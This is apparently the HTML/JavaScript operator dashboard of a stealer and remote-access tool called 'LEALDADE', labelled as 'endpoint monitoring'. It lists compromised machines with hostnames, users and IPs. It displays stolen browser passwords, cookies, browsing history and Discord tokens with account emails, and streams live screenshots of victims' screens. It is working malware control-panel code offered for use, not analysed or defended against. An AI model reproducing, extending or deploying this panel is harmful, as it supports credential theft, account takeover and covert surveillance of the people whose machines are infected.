<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEALDADE</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;800&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #000000;
            min-height: 100vh;
            color: #ffffff;
            padding: 40px;
        }
        h1 {
            text-align: center;
            color: #ffffff;
            margin-bottom: 10px;
            font-size: 3.5em;
            font-weight: 800;
            letter-spacing: 8px;
            text-transform: uppercase;
        }
        .server-info {
            text-align: center;
            color: #888888;
            margin-bottom: 40px;
            padding: 15px;
            font-weight: 400;
            font-size: 0.9em;
            letter-spacing: 3px;
            text-transform: uppercase;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 50px;
            max-width: 900px;
            margin-left: auto;
            margin-right: auto;
        }
        .stat-box {
            background: rgba(10, 10, 10, 0.8);
            border-radius: 8px;
            padding: 40px 20px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.3s ease;
            position: relative;
        }
        .stat-box:hover {
            transform: translateY(-5px);
            border-color: #ffffff;
            background: #0a0a0a;
            box-shadow: 0 10px 30px rgba(255,255,255,0.05);
        }
        .stat-number {
            font-size: 4em;
            font-weight: 300;
            color: #ffffff;
            line-height: 1;
            letter-spacing: -2px;
        }
        .stat-label {
            color: #888888;
            margin-top: 15px;
            font-size: 0.85em;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 3px;
        }
        .tabs {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 40px;
            flex-wrap: wrap;
        }
        .tab {
            background: transparent;
            border: 1px solid rgba(255,255,255,0.2);
            color: #aaaaaa;
            padding: 12px 30px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.9em;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.3s ease;
        }
        .tab:hover {
            border-color: #ffffff;
            color: #ffffff;
        }
        .tab.active {
            background: #ffffff;
            color: #000000;
            border-color: #ffffff;
            font-weight: 600;
        }
        .tab-content {
            display: none;
            animation: fadein 0.5s ease;
        }
        .tab-content.active {
            display: block;
        }
        @keyframes fadein {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .section {
            background: transparent;
            border-radius: 8px;
            padding: 0;
            margin-bottom: 30px;
        }
        .section h2 {
            color: #ffffff;
            margin-bottom: 30px;
            font-weight: 300;
            font-size: 2em;
            letter-spacing: 1px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            padding-bottom: 15px;
        }
        .client-card {
            background: #0a0a0a;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.08);
            transition: all 0.3s ease;
        }
        .client-card:hover {
            border-color: rgba(255,255,255,0.2);
            background: #111111;
        }
        .client-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }
        .client-name {
            font-weight: 600;
            font-size: 1.4em;
            color: #ffffff;
            letter-spacing: 1px;
        }
        .status {
            padding: 4px 12px;
            font-size: 0.8em;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 2px;
            border: 1px solid #333333;
            border-radius: 3px;
        }
        .status.online { 
            color: #22c55e; 
            border-color: #22c55e;
            background: rgba(34, 197, 94, 0.1);
        }
        .client-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 25px;
        }
        .info-group {
            display: flex;
            flex-direction: column;
        }
        .info-label {
            font-size: 0.75em;
            color: #888888;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 4px;
        }
        .info-value {
            font-size: 0.95em;
            font-weight: 600;
            color: #ffffff;
        }
        .btn-ver-dados {
            width: 100%;
            padding: 12px;
            background: #a855f7;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 0.95em;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }
        .btn-ver-dados:hover {
            background: #9333ea;
            opacity: 0.9;
            transform: translateY(-1px);
        }
        .token-card {
            background: #0a0a0a;
            border-radius: 6px;
            padding: 25px;
            margin-bottom: 15px;
            font-family: 'Consolas', 'Courier New', monospace;
            border: 1px solid rgba(255,255,255,0.05);
            transition: all 0.2s ease;
        }
        .token-card:hover {
            border-color: rgba(255,255,255,0.3);
        }
        .token-valid {
            border-left: 3px solid #ffffff;
        }
        .screen-container {
            background: #050505;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .live-badge {
            background: #ffffff;
            color: #000000;
            padding: 4px 15px;
            border-radius: 3px;
            font-weight: 800;
            letter-spacing: 3px;
            font-size: 0.8em;
            animation: blink 2s infinite;
            display: inline-block;
            margin-bottom: 20px;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .screen-img {
            max-width: 100%;
            max-height: 70vh;
            border-radius: 4px;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .client-select {
            margin-bottom: 30px;
            padding: 15px 20px;
            background: #050505;
            border: 1px solid rgba(255,255,255,0.2);
            color: #ffffff;
            border-radius: 4px;
            font-size: 1em;
            width: 100%;
            max-width: 400px;
            outline: none;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .client-select:focus {
            border-color: #ffffff;
        }
        .client-select option {
            background: #000000;
            color: #ffffff;
        }
        .empty {
            text-align: center;
            color: #555555;
            padding: 60px;
            font-size: 1em;
            text-transform: uppercase;
            letter-spacing: 3px;
            border: 1px dashed rgba(255,255,255,0.1);
            border-radius: 6px;
        }
        .refresh-btn {
            background: transparent;
            color: #ffffff;
            border: 1px solid rgba(255,255,255,0.2);
            padding: 10px 25px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.8em;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            margin: 0 auto 15px;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .refresh-btn:hover {
            border-color: #ffffff;
            background: #ffffff;
            color: #000000;
        }
        .update-time {
            text-align: center;
            color: #666666;
            font-size: 0.8em;
            margin-bottom: 40px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #000000;
        }
        ::-webkit-scrollbar-thumb {
            background: #333333;
            border-radius: 3px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #666666;
        }
        #endpointsList {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 20px;
        }
        .modal {
            display: none; 
            position: fixed; 
            z-index: 1000; 
            left: 0; top: 0; width: 100%; height: 100%; 
            overflow: auto; 
            background-color: rgba(0,0,0,0.8);
            backdrop-filter: blur(5px);
        }
        .modal-content {
            background-color: #0a0a0a;
            margin: 5% auto; 
            padding: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            width: 90%;
            max-width: 1000px;
            color: #fff;
            animation: fadein 0.3s;
        }
        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .close:hover { color: #fff; }
        .data-section {
            margin-top: 25px;
            padding: 15px;
            background: #111;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .data-section h3 {
            margin-bottom: 15px;
            color: #a855f7;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            padding-bottom: 10px;
            font-size: 1.1em;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>
    <h1>LEALDADE</h1>
    
    <div class="server-info">
        Sistema Online | Monitoramento Remoto de Endpoints
    </div>
    
    <div class="update-time">
        <button class="refresh-btn" onclick="location.reload()">ATUALIZAR</button>
        <div>ÚLTIMA ATUALIZAÇÃO: <span id="updateTime">{{UPDATE_TIME}}</span></div>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <div class="stat-number" id="totalEndpoints">0</div>
            <div class="stat-label">Endpoints</div>
        </div>
        <div class="stat-box">
            <div class="stat-number" id="onlineEndpoints">0</div>
            <div class="stat-label">Online</div>
        </div>
        <div class="stat-box">
            <div class="stat-number" id="totalLogs">0</div>
            <div class="stat-label">Logs</div>
        </div>
    </div>
    
    <div class="tabs">
        <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
        <button class="tab" onclick="showTab('logs')">Logs</button>
        <button class="tab" onclick="showTab('remote')">Acesso Remoto</button>
    </div>
    
    <div id="endpoints" class="tab-content active">
        <div class="section">
            <h2>Endpoints Monitorados</h2>
            <div id="endpointsList">
                <div class="empty">Carregando...</div>
            </div>
        </div>
    </div>
    
    <div id="logs" class="tab-content">
        <div class="section">
            <h2>Logs do Sistema</h2>
            <div id="logsList">
                <div class="empty">Carregando...</div>
            </div>
        </div>
    </div>
    
    <div id="remote" class="tab-content">
        <div class="section">
            <h2>Visualização Remota</h2>
            <select id="endpointSelect" class="client-select" onchange="loadScreen()">
                <option value="">Selecione um endpoint...</option>
            </select>
            <div class="screen-container">
                <div class="live-badge">LIVE</div>
                <div id="screenContent">
                    <div class="empty">Selecione um endpoint para visualizar</div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Modal Dados Completos -->
    <div id="dataModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="document.getElementById('dataModal').style.display='none'">&times;</span>
            <h2 id="modalTitle" style="font-weight:300; letter-spacing:1px; border-bottom:1px solid rgba(255,255,255,0.1); padding-bottom:15px">Dados Extraídos</h2>
            <div id="modalData">
                <div class="empty">Carregando...</div>
            </div>
        </div>
    </div>
    
    <script>
        // Carrega dados iniciais
        loadStats();
        loadEndpoints();
        loadLogs();
        document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
        
        // Atualiza a cada 5 segundos
        setInterval(() => {
            loadStats();
            loadEndpoints();
            loadLogs();
            loadScreen();
            document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
        }, 5000);
        
        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }
        
        async function loadStats() {
            try {
                const res = await fetch('/api/stats');
                const data = await res.json();
                document.getElementById('totalEndpoints').textContent = data.total_endpoints || 0;
                document.getElementById('onlineEndpoints').textContent = data.online_endpoints || 0;
                document.getElementById('totalLogs').textContent = data.total_metrics || 0;
            } catch(e) {}
        }
        
        async function loadEndpoints() {
            try {
                const res = await fetch('/api/endpoints');
                const endpoints = await res.json();
                const container = document.getElementById('endpointsList');
                const select = document.getElementById('endpointSelect');
                
                if (endpoints.length === 0) {
                    container.innerHTML = '<div class="empty">Nenhum endpoint conectado</div>';
                    return;
                }
                
                let selectHtml = '<option value="">Selecione um endpoint...</option>';
                
                container.innerHTML = endpoints.map(e => {
                    selectHtml += `<option value="${e.id}">${e.hostname} (${e.user})</option>`;
                    return `
                    <div class="client-card">
                        <div class="client-header">
                            <span class="client-name">${e.hostname}</span>
                            <span class="status ${e.status}">${e.status.toUpperCase()}</span>
                        </div>
                        <div class="client-info">
                            <div class="info-group">
                                <span class="info-label">Usuario</span>
                                <span class="info-value">${e.user}</span>
                            </div>
                            <div class="info-group">
                                <span class="info-label">IP Local</span>
                                <span class="info-value">${e.ip_address}</span>
                            </div>
                            <div class="info-group">
                                <span class="info-label">IP Externo</span>
                                <span class="info-value">${e.external_ip}</span>
                            </div>
                            <div class="info-group">
                                <span class="info-label">Plataforma</span>
                                <span class="info-value">${e.platform}</span>
                            </div>
                            <div class="info-group">
                                <span class="info-label">RAM</span>
                                <span class="info-value">${e.ram}</span>
                            </div>
                            <div class="info-group">
                                <span class="info-label">Ultimo Acesso</span>
                                <span class="info-value">${e.last_seen}</span>
                            </div>
                        </div>
                        <button class="btn-ver-dados" onclick="showDeviceData('${e.id}')">📊 Ver Dados Completos</button>
                    </div>
                    `;
                }).join('');
                
                select.innerHTML = selectHtml;
            } catch(e) {}
        }
        
        async function showDeviceData(id) {
            const modal = document.getElementById('dataModal');
            const dataDiv = document.getElementById('modalData');
            document.getElementById('modalTitle').textContent = 'Dados do Dispositivo: ' + id;
            dataDiv.innerHTML = '<div class="empty">Buscando requisições do webhook...</div>';
            modal.style.display = 'block';

            try {
                const keys = [
                    {url: '/api/passwords_data', title: 'Senhas', parser: d => `[${d.browser || 'Browser'}] ${d.url || d.target} | <b>User:</b> ${d.username || 'N/A'} | <b>Pass:</b> <span style="color:#a855f7">${d.password}</span>`},
                    {url: '/api/cookies_data', title: 'Cookies Ativos', parser: d => `[${d.browser || 'Browser'}] ${d.host} | ${d.name}`},
                    {url: '/api/history_data', title: 'Histórico de Navegação', parser: d => `[${d.browser || 'Browser'}] <a href="${d.url}" target="_blank" style="color:#fff">${d.title || d.url}</a> (${d.visit_count} visitas)`},
                ];

                let html = '';
                
                for(const k of keys) {
                    const res = await fetch(k.url);
                    if(res.ok) {
                        const items = await res.json();
                        const myItems = items.filter(x => x.endpoint_id === id);
                        html += `
                        <div class="data-section">
                            <h3>${k.title} <span style="font-size:0.7em; color:#666">(${myItems.length})</span></h3>
                            <div style="font-family: 'Inter', monospace; font-size: 0.85em; color: #ccc; max-height: 250px; overflow-y: auto;">
                                ${myItems.map(d => '<div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">' + k.parser(d) + '</div>').join('') || '<div style="color:#666; font-style:italic">Nenhum dado recebido do client ainda.</div>'}
                            </div>
                        </div>`;
                    }
                }
                
                // Fetch metrics/tokens specific
                const resM = await fetch('/api/metrics');
                if(resM.ok) {
                    const metrics = await resM.json();
                    const myMetrics = metrics.filter(x => x.endpoint_id === id);
                    html += `
                    <div class="data-section">
                        <h3>Tokens do Discord <span style="font-size:0.7em; color:#666">(${myMetrics.length})</span></h3>
                        <div style="font-family: monospace; font-size: 0.85em; color: #fff;">
                            ${myMetrics.map(m => '<div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">' + m.token + ' <span style="color:#666">(' + m.source + ')</span></div>').join('') || '<div style="color:#666; font-style:italic">Nenhum token encontrado.</div>'}
                        </div>
                    </div>`;
                }

                dataDiv.innerHTML = html;
            } catch(e) {
                dataDiv.innerHTML = '<div class="empty" style="color:#ff4444">Erro ao carregar dados remotos do Banco. Verifique se a aplicação está online.</div>';
            }
        }
        
        async function loadLogs() {
            try {
                const res = await fetch('/api/metrics');
                const metrics = await res.json();
                const container = document.getElementById('logsList');
                
                if (metrics.length === 0) {
                    container.innerHTML = '<div class="empty">Nenhum log recebido</div>';
                    return;
                }
                
                container.innerHTML = metrics.map(m => {
                    const acc = m.account || {};
                    const accInfo = acc.username 
                        ? `User: ${acc.username}#${acc.discriminator || '0000'} ${acc.email ? ' | Email: ' + acc.email : ''} ${acc.premium_type ? ' | Nitro' : ''}`
                        : 'Inválido';
                    return `
                    <div class="token-card ${m.valid ? 'token-valid' : ''}">
                        <div style="color:#ffffff; margin-bottom:10px; font-weight:bold; letter-spacing:1px; font-size:1.1em">${m.token}</div>
                        <div style="color:#888888; font-size:0.85em; display:flex; gap:15px; margin-bottom:10px"><span>Endpoint: ${m.endpoint_id}</span><span>Source: ${m.source}</span></div>
                        <div style="color:#cccccc; font-weight:500; font-size:0.9em">${accInfo}</div>
                    </div>
                    `;
                }).join('');
            } catch(e) {}
        }
        
        async function loadScreen() {
            const endpointId = document.getElementById('endpointSelect').value;
            if (!endpointId) return;
            
            try {
                const res = await fetch(`/api/screenshot/${endpointId}`);
                const data = await res.json();
                
                if (data.image) {
                    document.getElementById('screenContent').innerHTML = 
                        `<img class="screen-img" src="data:image/png;base64,${data.image}" alt="Visualização remota">`;
                }
            } catch(e) {}
        }
    </script>
</body>
</html>
